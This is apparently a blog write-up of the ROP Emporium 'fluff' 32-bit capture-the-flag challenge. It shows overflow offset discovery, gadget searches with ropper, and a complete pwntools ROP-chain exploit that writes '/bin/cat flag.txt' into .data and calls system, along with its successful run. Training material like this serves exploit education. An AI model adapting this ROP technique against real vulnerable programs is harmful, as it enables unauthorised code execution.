---
layout: post
title: ropemporium - fluff 32bit
---

This is a writeup on the (32bit) fluff challenge from ropemporium

## Summary
In this challenge I used to use a `popal` gadget to get values in the desired registers. I had to make sure that the register `ebx` was `0x00000000` because it would xor against a string that I could write. Then I wrote `/bin/cat flag.txt` into memory and called `system` with the string as an argument.

## Description
_The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. If we take the time to consider a different approach we'll succeed._

## Starting off
I always start off by using the executable normally.
```
qh@hhq:~/CTF/ropemporium/fluff/32$ ./fluff32 
fluff by ROP Emporium
32bits

You know changing these strings means I have to rewrite my solutions...
> ABC

Exiting
```
After that I created a string pattern with `pwntools`:
```python
>>> from pwn import *
>>> cyclic(50)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama'
>>> 
```
I put that in a file named `payload`:
`$ echo -n 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama' > payload`

I used `gdb` to check what the value of the instruction pointer (`EIP`) was:
```
qh@hhq:~/CTF/ropemporium/fluff/32$ gdb ./fluff32 -q
Reading symbols from ./fluff32...(no debugging symbols found)...done.
gdb-peda$ r < payload
Starting program: /home/qh/CTF/ropemporium/fluff/32/fluff32 < payload  
fluff by ROP Emporium
32bits                                              
                                                                                
You know changing these strings means I have to rewrite my solutions...
>       
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd250 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama")
EBX: 0x0
ECX: 0xf7f9189c --> 0x0
EDX: 0xffffd250 ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama")
ESI: 0xf7f90000 --> 0x1d9d6c
EDI: 0xf7f90000 --> 0x1d9d6c
EBP: 0x6161616b ('kaaa')
ESP: 0xffffd280 --> 0xf700616d
EIP: 0x6161616c ('laaa')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6161616c
[------------------------------------stack-------------------------------------]
0000| 0xffffd280 --> 0xf700616d
0004| 0xffffd284 --> 0xffffd2a0 --> 0x1
0008| 0xffffd288 --> 0x0
0012| 0xffffd28c --> 0xf7dd0b41 (<__libc_start_main+241>:       add    esp,0x10)
0016| 0xffffd290 --> 0xf7f90000 --> 0x1d9d6c
0020| 0xffffd294 --> 0xf7f90000 --> 0x1d9d6c
0024| 0xffffd298 --> 0x0
0028| 0xffffd29c --> 0xf7dd0b41 (<__libc_start_main+241>:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6161616c in ?? ()
gdb-peda$
```
The value of `EIP` was `0x6161616c` or `'laaa'`.
Coming back to `pwntools` I checked the length of the padding that I needed using the `fit` function.
```python
>>> len(fit({'laaa':'B'}))-1
44
```
The reason I subtract one from the length is because the `fit` function adds the `'B'` at the end.

## Finding a place to write
Upon doing `readelf -S fluff32` I found that the best place to write is at `.data` which is at the address: `0x0804a028` because of the free size and it is writeable memory.

## Looking for gadgets
Now that I had a place to write, I need to find a gadget that allows me to write to the address. I used `ropper` to find it.
```
$ ropper --file fluff32 --search mov
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: mov

[INFO] File: fluff32
0x08048709: mov dword ptr [0x81fffffd], eax; ret; 
0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
0x080485e9: mov eax, 0; mov ecx, dword ptr [ebp - 4]; leave; lea esp, dword ptr [ecx - 4]; ret; 
0x08048674: mov ebp, 0xcafebabe; ret; 
0x08048512: mov ebp, esp; sub esp, 0x10; push eax; push 0x804a030; call edx; 
0x080484d9: mov ebp, esp; sub esp, 0x14; push 0x804a030; call eax; 
0x0804856a: mov ebp, esp; sub esp, 0x14; push eax; call edx; 
0x080484b0: mov ebx, dword ptr [esp]; ret; 
0x080485ee: mov ecx, dword ptr [ebp - 4]; leave; lea esp, dword ptr [ecx - 4]; ret; 
0x0804867e: mov edi, 0xdeadbabe; ret; 
0x08048684: mov edi, 0xdeadbeef; xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret; 
0x0804868c: mov edx, 0xdefaced0; ret; 
0x08048686: mov esi, 0xca87dead; pop ebp; mov edx, 0xdefaced0; ret;
```
`0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;` would do.
Because of the `xor byte ptr [ecx], bl` I need to make sure that `ebx` remains `0x00000000`, because if you xor a byte against 0 it remains the current value.
Now I need to find `pop` gadgets.
```
$ ropper --file fluff32 --search pop
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop

[INFO] File: fluff32
0x0804867d: pop ebp; mov edi, 0xdeadbabe; ret; 
0x0804868b: pop ebp; mov edx, 0xdefaced0; ret; 
0x08048695: pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
0x080486fb: pop ebp; ret; 
0x080486f8: pop ebx; pop esi; pop edi; pop ebp; ret; 
0x08048696: pop ebx; xor byte ptr [ecx], bl; ret; 
0x080483e1: pop ebx; ret; 
0x08048692: pop edi; mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret; 
0x080486fa: pop edi; pop ebp; ret; 
0x08048670: pop edi; xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret; 
0x08048673: pop esi; mov ebp, 0xcafebabe; ret; 
0x080486f9: pop esi; pop edi; pop ebp; ret; 
0x0804867a: pop esi; xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret; 
0x080485f3: popal; cld; ret;
```
`0x080485f3: popal; cld; ret;` should work.
`popal` "pops" values from the stack into all registers in the order `EDI`, `ESI`, `EBP`, `EBX`, `EDX`, `ECX`, and `EAX`.

## Designing a ropchain
Now that I have every piece I can design a ropchain.
First we need to pop `/bin` into `edx` and the address to write into `ecx`.
Then we need to call the `mov dword ptr [ecx], edx` gadget.
And repeat this until we have written `/bin/cat flag.txt`.
So I came up with this code:
```python
from pwn import *

padding = 'A'*44
data_addr = 0x0804a028
popal = p32(0x080485f3)
mov_ecx = p32(0x08048693) #mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;                                                                                    
usefulFunction = p32(0x804864c)
pwnme = p32(0x80485f6)
system = p32(0x8048430)

def write(string,offset=0):
    write_chain = popal
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += string
    write_chain += p32(data_addr+offset)
    write_chain += p32(0x0)
    write_chain += mov_ecx
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    return write_chain
```
I decided to make the exploit script more efficient by making a function for making using the same ropchain multiple times.
After a bit of testing later I came up with the final exploit:
```python
from pwn import *

padding = 'A'*44
data_addr = 0x0804a028
popal = p32(0x080485f3)
mov_ecx = p32(0x08048693) #mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;                                                                                    
usefulFunction = p32(0x804864c)
pwnme = p32(0x80485f6)
system = p32(0x8048430)

def write(string,offset=0):
    write_chain = popal
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    write_chain += string
    write_chain += p32(data_addr+offset)
    write_chain += p32(0x0)
    write_chain += mov_ecx
    write_chain += p32(0x0)
    write_chain += p32(0x0)
    return write_chain

payload = padding

#first write
payload += write('/bin',0)

#second write
payload += write('/cat',4)

#third write
payload += write(' fla',8)

#fourth write
payload += write('g.tx',12)

#last write
payload += write('t\x00\x00\x00',16)

#system("/bin/cat flag.txt")
payload += system
payload += p32(0x0)
payload += p32(data_addr)
payload += p32(0x0)

print payload
```

## Testing the exploit
Now it was time I tested the exploit:
```
$ python exploit.py | ./fluff32
fluff by ROP Emporium
32bits

You know changing these strings means I have to rewrite my solutions...
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
Success!

